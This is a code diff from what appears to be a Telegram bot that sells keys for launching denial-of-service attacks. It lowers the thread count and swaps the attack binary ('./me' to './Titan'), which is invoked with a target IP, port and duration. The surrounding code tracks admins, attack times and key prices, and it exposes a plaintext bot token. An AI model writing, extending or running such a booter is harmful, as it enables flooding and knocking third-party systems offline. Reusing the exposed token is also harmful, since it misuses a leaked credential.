@@ -28,7 +28,7 @@ KEY_PRICES = {
 }
 ADMIN_IDS = [7163028849, 6280440192]
 BOT_TOKEN = "7828525928:AAGZIUO4QnLsD_ITKGSkfN5NlGP3UZvU1OM"
-thread_count = 1200
+thread_count = 800
 # packet_size = 512
 ADMIN_FILE = 'admin_data.json'
 last_attack_times = {}
@@ -361,7 +361,7 @@ async def run_attack_command_on_codespace(target_ip, target_port, duration, chat
         update_last_attack_time(user_id)
 
         # Construct command for dark binary with thread count and packet size
-        command = f"./me {target_ip} {target_port} {duration} {thread_count}"
+        command = f"./Titan {target_ip} {target_port} {duration} {thread_count}"
 
         # Send initial attack message
         bot.send_message(chat_id, 
